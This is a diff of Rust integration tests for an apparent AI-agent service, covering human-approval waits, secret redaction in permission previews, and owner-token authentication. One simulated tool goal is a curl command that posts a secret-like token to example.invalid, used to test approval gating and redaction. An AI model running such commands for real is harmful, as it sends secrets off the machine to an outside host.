@@ -1219,9 +1219,9 @@ async fn r1_bug_01_through_05_durability_human_wait_rebind_and_weekly_schedule()
         "WeeklyWallTime must compute exact next ISO weekday fire time in PG16"
     );
 
-    // D2-BUG-03 + D2-UX-05: Task with `max_wall_secs: Some(1)` waits 1.2s for human approval,
-    // populates redacted `preview_snippet` on `permission_requests`, and completes WITHOUT tripping
-    // RPC timeout or `max_wall_secs` budget (`wall_ms_used < 1000`)!
+    // D2-BUG-03 + D2-UX-05: Task with `max_wall_secs: Some(1)` waits 1.2s for human approval on a
+    // risky external command, populates redacted `preview_snippet` on `permission_requests`, and
+    // completes WITHOUT tripping RPC timeout or `max_wall_secs` budget (`wall_ms_used < 1000`)!
     let wait_task = svc
         .create_task(
             CreateTaskRequest {
@@ -1231,7 +1231,7 @@ async fn r1_bug_01_through_05_durability_human_wait_rebind_and_weekly_schedule()
                 parent_task_id: None,
                 title: Some(String::from("Human Wait Budget Task")),
                 goal: String::from(
-                    "[SIM:TOOL:write_file:approved.txt|safe text SUPER_SECRET_R1_TOKEN_999]",
+                    "[SIM:TOOL:run_command:curl https://example.invalid -d \"safe text SUPER_SECRET_R1_TOKEN_999\"]",
                 ),
                 schedule: None,
                 wait_for_signal: None,
@@ -1278,12 +1278,12 @@ async fn r1_bug_01_through_05_durability_human_wait_rebind_and_weekly_schedule()
         }
         time::sleep(Duration::from_millis(50)).await;
     }
-    let perm_req = pending_req.expect("pending ask_before_write request");
+    let perm_req = pending_req.expect("pending interactive shell approval request");
     assert_eq!(perm_req.status, PermissionRequestStatus::Pending);
     let snippet = perm_req
         .preview_snippet
         .as_deref()
-        .expect("D2-UX-05: preview_snippet must be populated on write_file approval request");
+        .expect("D2-UX-05: preview_snippet must be populated on risky shell approval request");
     assert!(
         !snippet.contains("SUPER_SECRET_R1_TOKEN_999"),
         "preview_snippet must redact configured secrets: {snippet}"
@@ -1324,7 +1324,17 @@ async fn r1_bug_01_through_05_durability_human_wait_rebind_and_weekly_schedule()
         "D2-BUG-03: wall_ms_used ({}) must exclude human wait time",
         wait_detail.task.usage.wall_ms_used
     );
-    assert!(ws_dir.join("approved.txt").is_file());
+    let wait_sess_detail = svc
+        .get_session_detail(wait_task.session_id)
+        .await
+        .expect("wait session detail");
+    assert!(
+        wait_sess_detail
+            .permission_decisions
+            .iter()
+            .any(|d| d.tool_name == "run_command" && d.effect == PolicyEffect::Allow),
+        "approved risky shell command must persist an Allow permission decision"
+    );
 
     // D2-BUG-01: Durable signal & clarification continuation across simulated Head restart!
     let sig_task = svc
@@ -1937,6 +1947,7 @@ async fn r1_control_mcp_e2e_agent_creates_event_and_enforces_token_isolation() {
         runtime_adapter_id: String::from("simulated"),
         runtime_is_simulated: true,
         allow_non_loopback: false,
+        owner_token: zeroize::Zeroizing::new(svc.owner_token().to_owned()),
         shutdown_tx: shutdown_tx.clone(),
         request_limit: Arc::new(Semaphore::new(MAX_CONCURRENT_REQUESTS)),
     });
@@ -1955,7 +1966,9 @@ async fn r1_control_mcp_e2e_agent_creates_event_and_enforces_token_isolation() {
         .await;
     });
 
-    let client = HeadClient::new(&head_url).expect("head client");
+    let client = HeadClient::new(&head_url)
+        .expect("head client")
+        .with_owner_token(svc.owner_token());
     let scope_a = unique_scope("ctrlmcp-a");
     let scope_b = unique_scope("ctrlmcp-b");
 
@@ -2317,6 +2330,7 @@ async fn v7_standalone_chats_enforce_deny_all_inline_artifacts_and_survive_proje
         runtime_adapter_id: String::from("simulated"),
         runtime_is_simulated: true,
         allow_non_loopback: false,
+        owner_token: zeroize::Zeroizing::new(svc.owner_token().to_owned()),
         shutdown_tx: shutdown_tx.clone(),
         request_limit: Arc::new(Semaphore::new(MAX_CONCURRENT_REQUESTS)),
     });
@@ -2335,7 +2349,9 @@ async fn v7_standalone_chats_enforce_deny_all_inline_artifacts_and_survive_proje
         .await;
     });
 
-    let client = HeadClient::new(&head_url).expect("client");
+    let client = HeadClient::new(&head_url)
+        .expect("client")
+        .with_owner_token(svc.owner_token());
     let health = client.healthz(None).await.expect("healthz");
     assert_eq!(
         health.schema_version,
@@ -2617,7 +2633,9 @@ async fn v7_standalone_chats_enforce_deny_all_inline_artifacts_and_survive_proje
     assert!(finalized.artifact.project_id.is_none());
 
     // 5. While a slow standalone turn is running, `get_state_snapshot(None, false)` MUST include it in `running_session_ids`!
-    let slow_client = HeadClient::new(&head_url).expect("slow client");
+    let slow_client = HeadClient::new(&head_url)
+        .expect("slow client")
+        .with_owner_token(svc.owner_token());
     let slow_sid = standalone_session.session_id;
     let slow_handle = tokio::spawn(async move {
         slow_client
@@ -2741,6 +2759,7 @@ async fn v7_pinning_projects_and_sessions_sorts_deterministically_and_emits_even
         runtime_adapter_id: String::from("simulated"),
         runtime_is_simulated: true,
         allow_non_loopback: false,
+        owner_token: zeroize::Zeroizing::new(svc.owner_token().to_owned()),
         shutdown_tx: shutdown_tx.clone(),
         request_limit: Arc::new(Semaphore::new(MAX_CONCURRENT_REQUESTS)),
     });
@@ -2759,7 +2778,9 @@ async fn v7_pinning_projects_and_sessions_sorts_deterministically_and_emits_even
         .await;
     });
 
-    let client = HeadClient::new(&head_url).expect("client");
+    let client = HeadClient::new(&head_url)
+        .expect("client")
+        .with_owner_token(svc.owner_token());
     let p1 = client
         .create_project(
             &CreateProjectRequest {
